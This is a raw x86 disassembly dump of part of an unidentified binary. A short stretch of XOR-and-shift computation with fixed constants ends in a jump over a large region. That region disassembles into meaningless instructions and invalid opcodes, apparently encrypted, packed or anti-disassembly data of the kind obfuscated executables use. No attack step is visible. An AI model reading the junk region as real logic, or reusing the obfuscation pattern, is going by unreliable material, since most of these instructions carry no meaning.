  409bcf:	xor    edx,edx
  409bd1:	or     eax,edx
  409bd3:	mov    cl,BYTE PTR [ebp+eax*1-0x4]
  409bd7:	mov    eax,DWORD PTR [ebp+0x14]
  409bda:	or     BYTE PTR [eax],cl
  409bdc:	mov    eax,DWORD PTR [ebp-0x48]
  409bdf:	mov    ecx,DWORD PTR [ebp-0x44]
  409be2:	shrd   eax,ecx,0x2
  409be6:	shr    ecx,0x2
  409be9:	mov    ecx,DWORD PTR [ebp-0x48]
  409bec:	mov    edx,DWORD PTR [ebp-0x44]
  409bef:	xor    eax,edi
  409bf1:	xor    edx,edx
  409bf3:	or     eax,edx
  409bf5:	add    eax,DWORD PTR ds:0x422568
  409bfb:	shl    ecx,0x1e
  409bfe:	mov    DWORD PTR [ebp+0x14],eax
  409c01:	mov    eax,DWORD PTR [ebp-0x48]
  409c04:	mov    ecx,DWORD PTR [ebp-0x44]
  409c07:	shrd   eax,ecx,0x2
  409c0b:	shr    ecx,0x2
  409c0e:	mov    ecx,DWORD PTR [ebp-0x48]
  409c11:	mov    edx,DWORD PTR [ebp-0x44]
  409c14:	xor    eax,edi
  409c16:	shl    ecx,0x1e
  409c19:	xor    edx,edx
  409c1b:	or     eax,edx
  409c1d:	mov    cl,BYTE PTR [ebp+eax*1-0x4]
  409c21:	mov    eax,DWORD PTR [ebp+0x14]
  409c24:	add    BYTE PTR [eax],cl
  409c26:	mov    eax,DWORD PTR [ebp-0x38]
  409c29:	mov    ecx,DWORD PTR [ebp-0x34]
  409c2c:	shrd   eax,ecx,0x2
  409c30:	shr    ecx,0x2
  409c33:	mov    ecx,DWORD PTR [ebp-0x38]
  409c36:	mov    edx,DWORD PTR [ebp-0x34]
  409c39:	xor    edx,edx
  409c3b:	xor    eax,edi
  409c3d:	or     eax,edx
  409c3f:	add    eax,DWORD PTR ds:0x422568
  409c45:	shl    ecx,0x1e
  409c48:	mov    ecx,DWORD PTR [ebp-0x38]
  409c4b:	mov    edx,DWORD PTR [ebp-0x34]
  409c4e:	shrd   ecx,edx,0x2
  409c52:	xor    ecx,edi
  409c54:	shr    edx,0x2
  409c57:	mov    edx,DWORD PTR [ebp-0x38]
  409c5a:	mov    edi,DWORD PTR [ebp-0x34]
  409c5d:	xor    edi,edi
  409c5f:	or     ecx,edi
  409c61:	mov    cl,BYTE PTR [ebp+ecx*1-0x4]
  409c65:	or     BYTE PTR [eax],cl
  409c67:	shl    edx,0x1e
  409c6a:	mov    edx,DWORD PTR [ebx]
  409c6c:	mov    eax,DWORD PTR [ebx+0x4]
  409c6f:	mov    edi,DWORD PTR [ebx]
  409c71:	mov    ecx,DWORD PTR [ebx+0x4]
  409c74:	xor    edx,0xca79a577
  409c7a:	xor    eax,0x9c1b89e8
  409c7f:	shrd   edx,eax,0x2
  409c83:	xor    ecx,ecx
  409c85:	or     ecx,edx
  409c87:	mov    DWORD PTR [ebp+0x8],ecx
  409c8a:	mov    ecx,DWORD PTR [esi]
  409c8c:	mov    edx,DWORD PTR [esi+0x4]
  409c8f:	xor    edx,0x9c1b89e8
  409c95:	xor    ecx,0xca79a577
  409c9b:	mov    DWORD PTR [ebp+0x14],ecx
  409c9e:	mov    ecx,edx
  409ca0:	mov    edx,DWORD PTR [ebp+0x14]
  409ca3:	shrd   edx,ecx,0x2
  409ca7:	shr    eax,0x2
  409caa:	shl    edi,0x1e
  409cad:	mov    DWORD PTR [ebp-0x6c],eax
  409cb0:	mov    DWORD PTR [ebp-0x70],edx
  409cb3:	mov    edx,DWORD PTR [esi]
  409cb5:	mov    eax,0x40000000
  409cba:	xor    edi,eax
  409cbc:	or     edi,DWORD PTR [ebp-0x6c]
  409cbf:	mov    DWORD PTR [ebp+0x14],edx
  409cc2:	shl    DWORD PTR [ebp+0x14],0x1e
  409cc6:	xor    DWORD PTR [ebp+0x14],eax
  409cc9:	mov    DWORD PTR [ebp+0xc],edi
  409ccc:	jmp    0x40a0aa
  409cd1:	jbe    0x409d4e
  409cd3:	fstp   TBYTE PTR [edx+ebx*8-0x78e4c9e4]
  409cda:	ins    DWORD PTR es:[edi],dx
  409cdb:	cmp    DWORD PTR [esi+ecx*2+0x23],0xffffffc9
  409ce0:	jl     0x409caf
  409ce2:	cmp    DWORD PTR [eax],ebx
  409ce4:	sbb    BYTE PTR [esi-0x58e7e7ee],bl
  409cea:	aaa    
  409ceb:	retf   0x95e0
  409cee:	pop    ebp
  409cef:	sub    eax,0xb6f5f920
  409cf4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409cf5:	fsub   QWORD PTR [eax]
  409cf7:	jecxz  0x409ca7
  409cf9:	ret    0x5eb6
  409cfc:	mov    bh,0xc4
  409cfe:	xchg   esp,eax
  409cff:	iret   
  409d00:	ret    
  409d01:	inc    esp
  409d02:	not    ecx
  409d04:	lods   al,BYTE PTR ds:[esi]
  409d05:	dec    esp
  409d06:	fidivr WORD PTR [eax]
  409d08:	inc    ecx
  409d09:	lds    ecx,FWORD PTR [ebx+ecx*2]
  409d0c:	pop    ss
  409d0d:	pop    esi
  409d0e:	lea    esi,[edi]
  409d10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d11:	clc    
  409d12:	jmp    0x8117e280
  409d17:	ret    0x803b
  409d1a:	mov    bh,0xec
  409d1c:	xchg   esp,eax
  409d1d:	sub    ebp,DWORD PTR [ecx]
  409d1f:	or     eax,ebx
  409d21:	and    cl,BYTE PTR [ebp+0x18]
  409d24:	or     eax,0xb8c6fae6
  409d29:	scas   eax,DWORD PTR es:[edi]
  409d2a:	xor    bh,bl
  409d2c:	outs   dx,DWORD PTR ds:[esi]
  409d2d:	ror    BYTE PTR [edx+0x28],1
  409d30:	mov    ebx,0xf2bdaa8b
  409d35:	fwait
  409d36:	dec    esi
  409d37:	loope  0x409cd8
  409d39:	pop    ss
  409d3a:	xor    eax,0xcbc857ea
  409d3f:	(bad)  [edi+0xd6f638c]
  409d45:	mul    BYTE PTR [edx-0x77ad817a]
  409d4b:	jp     0x409cda
  409d4d:	pop    ecx
  409d4e:	add    eax,0xfa9fb48b
  409d53:	ror    BYTE PTR [esi],1
  409d55:	pop    ebx
  409d56:	(bad)  
  409d57:	jno    0x409db8
  409d59:	push   ecx
  409d5a:	pop    esp
  409d5b:	mov    DWORD PTR [edx+0x24],ebp
  409d5e:	sar    DWORD PTR [ebp+0x561b667a],cl
  409d64:	sub    ebp,DWORD PTR [edi-0x6]
  409d67:	(bad)  
  409d68:	repz pushf 
  409d6a:	dec    ebx
  409d6b:	xchg   BYTE PTR [ecx],dl
  409d6d:	adc    eax,0x36330487
  409d72:	adc    cl,BYTE PTR [ebx]
  409d74:	fldenv [eax+edi*8]
  409d77:	clc    
  409d78:	pmaddwd mm7,QWORD PTR [ebx-0x29]
  409d7c:	outs   dx,DWORD PTR ds:[esi]
  409d7d:	jle    0x409dc3
  409d7f:	pop    edi
  409d80:	push   0x6fd79b03
  409d85:	imul   edx,DWORD PTR [ebx],0x69
  409d88:	sub    dh,ah
  409d8a:	xor    DWORD PTR [edi-0x922fc1c],ecx
  409d90:	inc    ebp
  409d91:	(bad)  
  409d92:	sub    al,0x4b
  409d94:	push   ds
  409d95:	pop    ebx
  409d96:	dec    esp
  409d97:	pop    ecx
  409d98:	clc    
  409d99:	and    esi,esi
  409d9b:	mov    edi,0x8b67b649
  409da0:	jbe    0x409ded
  409da2:	inc    ebp
  409da3:	mov    dh,0x6
  409da5:	outs   dx,DWORD PTR ds:[esi]
  409da6:	inc    ebp
  409da7:	push   0x4d3e80d9
  409dac:	aaa    
  409dad:	sar    DWORD PTR [edx-0x6d9e9a45],1
  409db3:	mov    WORD PTR [ecx],ds
  409db5:	inc    ebp
  409db6:	ss pop ecx
  409db8:	xchg   DWORD PTR [ebx-0x28a4e342],esp
  409dbe:	push   ds
  409dbf:	xor    bh,cl
  409dc1:	and    DWORD PTR [ebx+0x62bfff98],0x9e35774d
  409dcb:	push   ebp
  409dcc:	push   0x58
  409dce:	xor    ecx,ebx
  409dd0:	mov    ds:0x99e92b59,al
  409dd5:	call   0x845d:0xebec6096
  409ddc:	xor    dl,BYTE PTR [ebp+ebp*2-0x31]
  409de0:	sbb    ch,bh
  409de2:	jecxz  0x409df8
  409de4:	mov    eax,0x2a2e353a
  409de9:	mov    ch,0x98
  409deb:	int3   
  409dec:	add    DWORD PTR [edx],edx
  409dee:	cdq    
  409def:	aas    
  409df0:	add    BYTE PTR [esi+ebx*4+0x71065eeb],dh
  409df7:	out    0xda,al
  409df9:	enter  0x12f0,0xa4
  409dfd:	push   esp
  409dfe:	sar    BYTE PTR [ebp-0x39],0x2
  409e02:	pop    es
  409e03:	jge    0x409e28
  409e05:	test   eax,0x8efaf3b8
  409e0a:	dec    ecx
  409e0b:	mov    DWORD PTR [esi+0x53],eax
  409e0e:	cmp    cl,cl
  409e10:	je     0x409dee
  409e12:	sbb    ecx,ebx
  409e14:	mov    bh,0x87
  409e16:	cmc    
  409e17:	jmp    0x409e8c
  409e19:	xlat   BYTE PTR ds:[ebx]
  409e1a:	add    cl,BYTE PTR [edx]
  409e1c:	add    BYTE PTR [eax],ch
  409e1e:	mov    al,ds:0xbbfb2628
  409e23:	popf   
  409e24:	dec    ebx
  409e25:	ins    DWORD PTR es:[edi],dx
  409e26:	sbb    BYTE PTR [ebp+0x37],ah
  409e29:	jno    0x409e09
  409e2b:	push   cs
  409e2c:	scas   al,BYTE PTR es:[edi]
  409e2d:	add    DWORD PTR [edx+eax*4],ebx
  409e30:	jge    0x409e28
  409e32:	adc    BYTE PTR [ebx+eiz*4+0x5a54ceb7],al
  409e39:	retf   
  409e3a:	dec    ecx
  409e3b:	xor    eax,0xc3cde718
  409e40:	add    eax,0x2e3860ea
  409e45:	scas   eax,DWORD PTR es:[edi]
  409e46:	jge    0x409e7d
  409e48:	scas   al,BYTE PTR es:[edi]
  409e49:	aam    0x4c
  409e4b:	xlat   BYTE PTR ds:[ebx]
  409e4c:	jb     0x409e5e
  409e4e:	jno    0x409e30
  409e50:	jg     0x409e49
  409e52:	mov    eax,0xdd65b74f
  409e57:	jp     0x409de9
  409e59:	ss push 0x4b8a4bc3
  409e5f:	mov    dl,0x8c
  409e61:	or     dl,BYTE PTR [ebx-0x5e7b2f04]
  409e67:	xchg   esi,eax
  409e68:	cmp    eax,0xcc54bfba
  409e6d:	push   ebx
  409e6e:	aam    0x90
  409e70:	(bad)  
  409e71:	iret   
  409e72:	out    dx,eax
  409e73:	mov    eax,0x65d31a11
  409e78:	push   cs
  409e79:	xor    al,0xac
  409e7b:	out    dx,al
  409e7c:	outs   dx,DWORD PTR ds:[esi]
  409e7d:	fdiv   DWORD PTR ds:0xcd0187ca
  409e83:	mov    edx,0x608f3d4b
  409e88:	daa    
  409e89:	fldln2 
  409e8b:	push   ds
  409e8c:	shl    DWORD PTR [esi+0x13],1
  409e8f:	sbb    al,0xf1
  409e91:	outs   dx,DWORD PTR ds:[esi]
  409e92:	cmp    eax,0xd9f6911b
  409e97:	(bad)  
  409e98:	(bad)
  409e9c:	retw   0x1018
  409ea0:	jne    0x409e9d
  409ea2:	sub    bh,BYTE PTR [ecx-0x2859b947]
  409ea8:	inc    di
  409eaa:	stc    
  409eab:	pop    ss
  409eac:	imul   eax,esp,0x92660e8d
  409eb2:	xor    al,0xf9
  409eb4:	add    DWORD PTR [ebx+0xbdb757e],ecx
  409eba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409ebb:	jb     0x409e6d
  409ebd:	push   edx
  409ebe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ebf:	fstp   TBYTE PTR [edi+ebx*1]
  409ec2:	and    al,BYTE PTR [ebx+0x47171870]
  409ec8:	test   al,0xd4
  409eca:	sbb    al,0x88
  409ecc:	cli    
  409ecd:	clc    
  409ece:	call   0x8693f8e1
  409ed3:	les    eax,FWORD PTR [ebx]
  409ed5:	outs   dx,DWORD PTR ds:[esi]
  409ed6:	int3   
  409ed7:	inc    eax
  409ed8:	cmp    al,0x84
  409eda:	test   eax,0x18f5a747
  409edf:	mov    es,esp
  409ee1:	sbb    al,0x4
  409ee3:	sub    ecx,esp
  409ee5:	xor    edx,DWORD PTR [edx+0x7f]
  409ee8:	lock test eax,0x1b4c984d
  409eee:	ror    esp,cl
  409ef0:	(bad)
  409ef3:	outs   dx,BYTE PTR ds:[esi]
  409ef4:	xor    ecx,DWORD PTR [esi+0x40]
  409ef7:	enter  0xabe1,0xa3
  409efb:	and    eax,eax
  409efd:	js     0x409f76
  409eff:	push   ds
  409f00:	or     cl,ch
  409f02:	adc    BYTE PTR [eax],ch
  409f04:	mov    eax,ds:0xa1957ba9
  409f09:	push   ecx
  409f0a:	mov    al,ds:0x3b32399a
  409f0f:	adc    DWORD PTR [ecx],ecx
  409f11:	inc    ax
  409f13:	sub    al,0x85
  409f15:	xchg   ebx,eax
  409f16:	and    dh,ch
  409f18:	jo     0x409f57
  409f1a:	fcmovnbe st,st(2)
  409f1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f1d:	loopne 0x409ebc
  409f1f:	addr16 pop es
  409f21:	xlat   BYTE PTR ds:[ebx]
  409f22:	mov    DWORD PTR [eax],esp
  409f24:	data16 xlat BYTE PTR ds:[ebx]
  409f26:	mov    eax,0xcf667006
  409f2b:	xor    DWORD PTR [ecx+0x1f0fbde0],edx
  409f31:	enter  0x64c9,0xdb
  409f35:	pop    ecx
  409f36:	jmp    0x409f8b
  409f38:	or     DWORD PTR [edi],edi
  409f3a:	fs popf 
  409f3c:	cmp    eax,0x2e178178
  409f41:	stos   DWORD PTR es:[edi],eax
  409f42:	adc    ebp,DWORD PTR ds:[esi+eax*1]
  409f46:	outs   dx,DWORD PTR ds:[esi]
  409f47:	cmp    BYTE PTR [ecx],ah
  409f49:	leave  
  409f4a:	cli    
  409f4b:	sahf   
  409f4c:	ror    DWORD PTR [eax+edx*1+0x5eccd824],1
  409f53:	mov    bl,0x2a
  409f55:	std    
  409f56:	xchg   ebx,eax
  409f57:	adc    eax,0xa12ccce9
  409f5c:	es inc ecx
  409f5e:	call   ebx
  409f60:	test   al,0xc8
  409f62:	mov    DWORD PTR [esi-0x33a0d340],eax
  409f68:	sub    BYTE PTR [ecx-0x36],dh
  409f6b:	push   0x21fa892b
  409f70:	push   eax
  409f71:	test   ch,0x7c
  409f74:	or     eax,0xf60bcc62
  409f79:	jmp    0xf7d17f61
  409f7e:	mov    edi,ss
  409f80:	mov    dh,0xa7
  409f82:	jg     0x409f5d
  409f84:	xchg   edi,eax
  409f85:	fst    DWORD PTR [ecx]
  409f87:	mov    bl,0x87
  409f89:	inc    esp
  409f8a:	stc    
  409f8b:	aas    
  409f8c:	in     eax,0xbe
  409f8e:	ins    BYTE PTR es:[edi],dx
  409f8f:	dec    esp
  409f90:	jecxz  0x409fcb
  409f92:	mov    ebx,0x12e43509
  409f97:	mov    DWORD PTR [esi-0x40aecf24],edi
  409f9d:	test   eax,0xb13c342
  409fa2:	add    al,0xc2
  409fa4:	mov    bl,0xb4
  409fa6:	rol    BYTE PTR [eax-0x333f7001],cl
  409fac:	and    ecx,ebp
  409fae:	lock js 0x409f65
  409fb1:	add    DWORD PTR [ebx-0x6c82180e],ebx
  409fb7:	jo     0x409fd9
  409fb9:	js     0x40a02c
  409fbb:	pop    eax
  409fbc:	jl     0x409f48
  409fbe:	fistp  DWORD PTR [eax]
  409fc0:	je     0x409f56
  409fc2:	aad    0xdf
  409fc4:	loop   0x409fad
  409fc6:	push   ss
  409fc7:	ret    
  409fc8:	xlat   BYTE PTR ds:[ebx]
  409fc9:	fadd   DWORD PTR [edi]
  409fcb:	and    esi,ecx
  409fcd:	mov    bh,0x36
  409fcf:	jmp    0x40a004
  409fd1:	mov    ecx,0x2576838c
  409fd6:	out    dx,al
  409fd7:	je     0x409ffa
  409fd9:	add    BYTE PTR [ecx+0x50],ah
  409fdc:	sbb    DWORD PTR [ebx*2+0x514874],eax
  409fe3:	push   ebx
  409fe4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409fe5:	push   ss
  409fe6:	dec    DWORD PTR [esi+edx*4-0x2152e63f]
  409fed:	dec    BYTE PTR [edx+eiz*4]
  409ff0:	out    dx,al
  409ff1:	xor    esp,edi
  409ff3:	ss pusha 
  409ff5:	(bad)  
  409ff6:	mov    dl,0x3a
  409ff8:	fidiv  DWORD PTR [edx+0x5051f4f7]
  409ffe:	sar    ecx,0x9d
  40a001:	test   eax,0xcb5f6865
  40a006:	sub    eax,0xb8fea21d
  40a00b:	scas   al,BYTE PTR es:[edi]
  40a00c:	cmp    BYTE PTR [esi],0xc4
  40a00f:	xchg   edi,eax
  40a010:	mov    ds:0x7e833e20,eax
  40a015:	jp     0x409fa5
  40a017:	sub    cl,0xd7
  40a01a:	imul   ebp,DWORD PTR [edi+0x4fa07ad6],0xbea7724c
  40a024:	sbb    edx,DWORD PTR [ebx]
  40a026:	xchg   bh,ah
  40a028:	and    eax,0x93199ea5
  40a02d:	jno    0x409fb2
  40a02f:	and    ebp,edi
  40a031:	cmp    edi,ecx
  40a033:	adc    eax,eax
  40a035:	mov    ebp,DWORD PTR [edx-0x1f]
  40a038:	(bad)  
  40a039:	neg    ebp
  40a03b:	jae    0x409ff0
  40a03d:	mov    esi,0xe99fdf37
  40a042:	jmp    0x93a1359d
  40a047:	sub    BYTE PTR [edx+0x2e0668ac],ah
  40a04d:	sbb    eax,0xe078d847
  40a052:	push   ecx
  40a053:	pop    eax
  40a054:	lahf   
  40a055:	lods   al,BYTE PTR ds:[esi]
  40a056:	mov    WORD PTR [esi],?
  40a058:	mov    edx,0x5474b1f5
  40a05d:	mov    ebx,0x283f362f
  40a062:	lods   al,BYTE PTR ds:[esi]
  40a063:	or     al,0x80
  40a065:	jmp    0x58e94186
  40a06a:	or     al,0x47
  40a06c:	mov    esi,DWORD PTR [eax+edi*2]
  40a06f:	mov    ah,0xf5
  40a071:	test   al,0x2b
  40a073:	mov    esi,cs
  40a075:	aad    0x40
  40a077:	fs pop esp
  40a079:	push   eax
  40a07a:	ficom  WORD PTR [edx+0x5b99b6f7]
  40a080:	addr16 dec edx
  40a082:	push   ebx
  40a083:	loopne 0x40a0b8
  40a085:	and    esi,edx
  40a087:	or     BYTE PTR [eax],ah
  40a089:	pop    ecx
  40a08a:	xlat   BYTE PTR ds:[ebx]
  40a08b:	arpl   dx,dx
  40a08d:	adc    eax,0x4457182a
  40a092:	jbe    0x40a0af
  40a094:	stos   DWORD PTR es:[edi],eax
  40a095:	jmp    0x4be4:0x7b27aea7
  40a09c:	pop    esi
  40a09d:	mov    ah,0x94
  40a09f:	dec    ecx
  40a0a0:	push   edx
  40a0a1:	adc    eax,0x2da10bc1
  40a0a6:	mov    cl,0x3c
  40a0a8:	xor    al,0x6e
  40a0aa:	mov    edi,DWORD PTR [esi+0x4]
  40a0ad:	mov    edi,DWORD PTR [ebp+0x14]
  40a0b0:	xor    edx,edx
  40a0b2:	or     edx,DWORD PTR [ebp-0x70]
  40a0b5:	shr    ecx,0x2
  40a0b8:	or     edi,ecx
  40a0ba:	cmp    edx,DWORD PTR [ebp+0x8]
  40a0bd:	jne    0x40a9b0
  40a0c3:	cmp    edi,DWORD PTR [ebp+0xc]
  40a0c6:	jne    0x40a9b0
  40a0cc:	jmp    0x40a926
  40a0d1:	mov    eax,DWORD PTR [esi]
  40a0d3:	mov    edx,DWORD PTR [esi+0x4]
  40a0d6:	mov    eax,DWORD PTR [esi]
  40a0d8:	mov    edx,DWORD PTR [esi+0x4]
  40a0db:	xor    eax,0xca79a577
  40a0e0:	xor    edx,ecx
  40a0e2:	mov    ecx,eax
  40a0e4:	mov    eax,edx
  40a0e6:	shrd   ecx,eax,0x2
  40a0ea:	shr    eax,0x2
  40a0ed:	mov    DWORD PTR [ebp+0xc],eax
  40a0f0:	mov    eax,DWORD PTR [esi]
  40a0f2:	mov    edx,DWORD PTR [esi+0x4]
  40a0f5:	mov    edx,eax
  40a0f7:	xor    eax,eax
  40a0f9:	or     eax,ecx
  40a0fb:	mov    ecx,DWORD PTR [ebx]
  40a0fd:	shl    edx,0x1e
  40a100:	xor    edx,0x40000000
  40a106:	mov    DWORD PTR [ebp+0x10],eax
  40a109:	mov    eax,edx
  40a10b:	or     eax,DWORD PTR [ebp+0xc]
  40a10e:	mov    edx,DWORD PTR [ebx+0x4]
  40a111:	push   eax
  40a112:	push   DWORD PTR [ebp+0x10]
  40a115:	push   edx
  40a116:	push   ecx
  40a117:	jmp    0x40a4f5
  40a11c:	std    
  40a11d:	dec    ecx
  40a11e:	mov    ah,0xd2
  40a120:	sub    al,0x22
  40a122:	fidivr DWORD PTR [edi]
  40a124:	test   al,0x29
  40a126:	push   ebp
  40a127:	stos   BYTE PTR es:[edi],al
  40a128:	call   0x52bf804b
  40a12d:	xor    ebx,DWORD PTR [eax]
  40a12f:	sbb    BYTE PTR [esi+0x7e181812],bl
  40a135:	dec    ecx
  40a136:	aaa    
  40a137:	stc    
  40a138:	in     eax,dx
  40a139:	push   eax
  40a13a:	aas    
  40a13b:	mul    BYTE PTR [ebp-0x63cc2ae6]
  40a141:	cld    
  40a142:	and    eax,0xdd92a95b
  40a147:	mov    esi,0x9aad24e1
  40a14c:	mov    ebx,0x8d99f7ec
  40a151:	add    DWORD PTR [ebp-0x5c],ebp
  40a154:	jmp    0xfbca6e2e
  40a159:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a15a:	je     0x40a151
  40a15c:	mov    ds:0xacacfebd,eax
  40a161:	pop    ss
  40a162:	add    al,0x14
  40a164:	jnp    0x40a1d5
  40a166:	mov    eax,0xcb9ac3c7
  40a16b:	jno    0x40a0f9
  40a16d:	rol    ch,0xc7
  40a170:	pop    ss
  40a171:	gs mov edx,0x60f83ba4
  40a177:	das    
  40a178:	mov    ebx,0x183a86ed
  40a17d:	pop    ss
  40a17e:	pop    ss
  40a17f:	dec    edi
  40a180:	cmp    bh,cl
  40a182:	jne    0x40a1dc
  40a184:	sbb    BYTE PTR [ebp+ecx*2+0x2b450374],0x1a
  40a18c:	pop    edi
  40a18d:	popf   
  40a18e:	push   cs
  40a18f:	test   BYTE PTR ds:0x18043666,bl
  40a195:	shl    DWORD PTR [ecx-0x6428c0a2],cl
  40a19b:	pop    ebx
  40a19c:	xor    eax,DWORD PTR [eax]
  40a19e:	add    edi,DWORD PTR [esi]
  40a1a0:	jp     0x40a200
  40a1a2:	mov    ch,0x5
  40a1a4:	(bad)  
  40a1a5:	and    eax,0x8cc3193f
  40a1aa:	in     eax,0x5e
  40a1ac:	jl     0x40a190
  40a1ae:	mov    ds:0x4ffedb1a,eax
  40a1b3:	jmp    0xd71222b2
  40a1b8:	lock js 0x40a1ca
  40a1bb:	lock mov ch,0xc
  40a1be:	jmp    0x32a8:0x62984450
  40a1c5:	or     edx,ecx
  40a1c7:	mov    cs,WORD PTR [ecx-0x42]
  40a1ca:	mov    eax,ds:0x17f8f917
  40a1cf:	mov    dh,0xc7
  40a1d1:	daa    
  40a1d2:	ret    0xfc98
  40a1d5:	push   edi
  40a1d6:	repnz pusha 
  40a1d8:	add    DWORD PTR [ebp-0x2f],eax
  40a1db:	lods   al,BYTE PTR ds:[esi]
  40a1dc:	xor    edx,eax
  40a1de:	mov    ecx,es
  40a1e0:	scas   al,BYTE PTR es:[edi]
  40a1e1:	test   DWORD PTR [edi],ebp
  40a1e3:	mov    al,0xe1
  40a1e5:	jmp    0xa44b:0x23281bb1
  40a1ec:	scas   al,BYTE PTR es:[edi]
  40a1ed:	or     ebp,eax
  40a1ef:	in     eax,dx
  40a1f0:	iret   
  40a1f1:	shl    BYTE PTR [ebx],1
  40a1f3:	lods   al,BYTE PTR ds:[esi]
  40a1f4:	pusha  
  40a1f5:	or     eax,0x31d823a8
  40a1fa:	mov    cl,BYTE PTR [ebx+0x6f]
  40a1fd:	stos   BYTE PTR es:[edi],al
  40a1fe:	jnp    0x40a193
  40a200:	mov    eax,0xecb66042
  40a205:	push   0x42
  40a207:	mov    ebp,0x4af07992
  40a20c:	ins    DWORD PTR es:[edi],dx
  40a20d:	pop    es
  40a20e:	mov    DWORD PTR [ecx+eiz*8],edi
  40a211:	mov    al,ds:0x2b75c505
  40a216:	pop    esi
  40a217:	jle    0x40a287
  40a219:	or     DWORD PTR [ebx+ebx*2-0x17],edi
  40a21d:	cmp    edx,edi
  40a21f:	adc    eax,0xa8764231
  40a224:	xchg   ebp,eax
  40a225:	mov    esp,DWORD PTR ds:0x6148c895
  40a22b:	and    ebx,esi
  40a22d:	shr    DWORD PTR [edx-0x70],cl
  40a230:	fidiv  WORD PTR [esi-0x21f39023]
  40a236:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a237:	pop    ebx
  40a238:	jne    0x40a257
  40a23a:	inc    esp
  40a23b:	mov    ecx,0x21686ee9
  40a240:	js     0x40a210
  40a242:	pop    ds
  40a243:	(bad)  
  40a245:	imul   ebx,DWORD PTR [ebx+0x5c],0x28
  40a249:	push   eax
  40a24a:	out    dx,eax
  40a24b:	mov    WORD PTR [ebx+ebx*2],cs
  40a24e:	mov    bl,0x21
  40a250:	fdivr  DWORD PTR [edi+0x2a]
  40a253:	ds pop ebx
  40a255:	xor    eax,0x1bd17b0f
  40a25a:	xor    ebx,DWORD PTR [eax]
  40a25c:	fiadd  WORD PTR [esi-0xd]
  40a25f:	inc    ebx
  40a260:	jmp    0x3525bcbb
  40a265:	dec    eax
  40a266:	fdivp  st(7),st
  40a268:	add    al,0x8a
  40a26a:	dec    edx
  40a26b:	cli    
  40a26c:	shl    DWORD PTR [eax+0x54],0xf1
  40a270:	and    al,0x72
  40a272:	push   ds
  40a273:	aas    
  40a274:	call   0x162:0xaff981cb
  40a27b:	lahf   
  40a27c:	mov    edx,0xf518e130
  40a281:	adc    al,0xca
  40a283:	das    
  40a284:	inc    ebp
  40a285:	fst    DWORD PTR [edi+0x77]
  40a288:	xchg   edi,eax
  40a289:	adc    esi,ebp
  40a28b:	dec    ecx
  40a28c:	or     DWORD PTR [esi-0x2d],ebx
  40a28f:	or     eax,0x60a26ce4
  40a294:	sbb    eax,0xfd988318
  40a299:	das    
  40a29a:	pop    ecx
  40a29b:	rcr    DWORD PTR [edx+ebp*1-0x7d3adf06],0xe5
  40a2a3:	adc    eax,0xdf9ffc05
  40a2a8:	sub    eax,0x7028541a
  40a2ad:	push   eax
  40a2ae:	and    al,0xe5
  40a2b0:	clc    
  40a2b1:	loop   0x40a312
  40a2b3:	mov    al,ds:0x92070ba6
  40a2b8:	(bad)  
  40a2b9:	xchg   ecx,eax
  40a2ba:	fwait
  40a2bb:	pop    ebp
  40a2bc:	les    edi,FWORD PTR [ebp+esi*4+0x6e8da31f]
  40a2c3:	int3   
  40a2c4:	cmp    DWORD PTR [esi+0x205fcbd1],edx
  40a2ca:	nop
  40a2cb:	fcom   DWORD PTR es:[ecx]
  40a2ce:	inc    ebx
  40a2cf:	xchg   edx,eax
  40a2d0:	dec    ebx
  40a2d1:	test   eax,0xc65c4934
  40a2d6:	mul    BYTE PTR [edx+0x1c90ac27]
  40a2dc:	dec    ebx
  40a2dd:	fstp   DWORD PTR [esi]
  40a2df:	in     eax,0xc2
  40a2e1:	dec    ecx
  40a2e2:	rcl    DWORD PTR [edx-0x27f3dbfa],1
  40a2e8:	sbb    ebx,0xe65a15d1
  40a2ee:	push   ss
  40a2ef:	dec    edi
  40a2f0:	outs   dx,DWORD PTR ds:[esi]
  40a2f1:	and    al,0xe4
  40a2f3:	mov    ecx,0x9fa48a19
  40a2f8:	inc    ebx
  40a2f9:	or     esi,esi
  40a2fb:	and    BYTE PTR [ecx-0x5661112],ch
  40a301:	nop
  40a302:	xor    dl,BYTE PTR [eax+esi*1]
  40a305:	daa    
  40a306:	int3   
  40a307:	xchg   ebp,eax
  40a308:	cmp    ch,BYTE PTR [ecx+0x16]
  40a30b:	pop    edi
  40a30c:	cmp    BYTE PTR [ebx],0xfa
  40a30f:	and    eax,0x876b0ea0
  40a314:	jmp    0x4c7b4c71
  40a319:	mov    ebp,0x6c916014
  40a31e:	mov    DWORD PTR [eax+0x1d007798],esi
  40a324:	cs (bad) 
  40a326:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a327:	fldcw  WORD PTR [esi+0x2d56efc8]
  40a32d:	ja     0x40a315
  40a32f:	xchg   esp,eax
  40a330:	adc    al,0x52
  40a332:	and    BYTE PTR [ebx+0x62],ah
  40a335:	xchg   ebx,eax
  40a336:	out    0x9c,al
  40a338:	mov    al,0x35
  40a33a:	jmp    0x40a3af
  40a33c:	inc    ebx
  40a33d:	outs   dx,BYTE PTR ds:[esi]
  40a33e:	push   ebx
  40a33f:	sbb    esp,DWORD PTR ds:0x4ba72ee4
  40a345:	push   ebx
  40a346:	(bad)  
  40a347:	int3   
  40a348:	sub    eax,0x788faa6c
  40a34d:	mov    ecx,0x1d6c0fde
  40a352:	loope  0x40a3a6
  40a354:	push   edx
  40a355:	push   esp
  40a356:	cmp    ch,BYTE PTR [eax]
  40a358:	jno    0x40a33d
  40a35a:	nop
  40a35b:	sbb    eax,0xcb9e8657
  40a360:	dec    esp
  40a361:	clc    
  40a362:	mov    DWORD PTR [ecx-0xefbfbd8],edi
  40a368:	xchg   ebp,eax
  40a369:	cmp    BYTE PTR ds:0x36fcb15,ah
  40a36f:	lock out 0xd8,eax
  40a372:	xchg   ecx,eax
  40a373:	popa   
  40a374:	pop    esi
  40a375:	xchg   DWORD PTR [edi],ebp
  40a377:	das    
  40a378:	mov    ds:0x8c1f310e,al
  40a37d:	sub    DWORD PTR [eax],edx
